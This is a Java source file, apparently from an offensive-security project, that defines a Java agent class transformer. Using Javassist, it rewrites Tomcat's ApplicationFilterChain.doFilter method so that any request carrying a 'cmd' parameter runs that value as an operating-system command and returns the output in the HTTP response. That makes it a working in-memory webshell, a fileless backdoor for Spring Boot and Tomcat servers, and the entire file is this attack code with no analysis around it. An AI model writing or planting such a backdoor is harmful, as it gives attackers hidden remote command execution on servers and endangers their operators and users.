package com.madahaRCE.CodeSecAgentmain;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class SpringbootTransformer implements ClassFileTransformer {
    public static final String CLASSNAME = "org.apache.catalina.core.ApplicationFilterChain";
    public static final String CLASSMETHOD = "doFilter";

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        try {
            ClassPool pool = ClassPool.getDefault();
            if (classBeingRedefined != null) {
                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);
                pool.insertClassPath(ccp);
            }
            if (className.replace("/", ".").equals(CLASSNAME)) {
                CtClass clazz = pool.get(CLASSNAME);
                CtMethod method = clazz.getDeclaredMethod(CLASSMETHOD);
                method.insertBefore("javax.servlet.http.HttpServletRequest httpServletRequest = (javax.servlet.http.HttpServletRequest) request;\n" +
                        "String cmd = request.getParameter(\"cmd\");\n" +
                        "if (cmd != null){\n" +
                        "    Process process = Runtime.getRuntime().exec(cmd);\n" +
                        "    java.io.InputStream input = process.getInputStream();\n" +
                        "    java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(input));\n" +
                        "    StringBuilder sb = new StringBuilder();\n" +
                        "    String line = null;\n" +
                        "    while ((line = br.readLine()) != null){\n" +
                        "        sb.append(line + \"\\n\");\n" +
                        "    }\n" +
                        "    br.close();\n" +
                        "    input.close();\n" +
                        "    response.getOutputStream().print(sb.toString());\n" +
                        "    response.getOutputStream().flush();\n" +
                        "    response.getOutputStream().close();\n" +
                        "}");
                byte[] classbyte = clazz.toBytecode();
                clazz.detach();
                System.out.println("transform success!!");
                return classbyte;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        return classfileBuffer;
    }
}
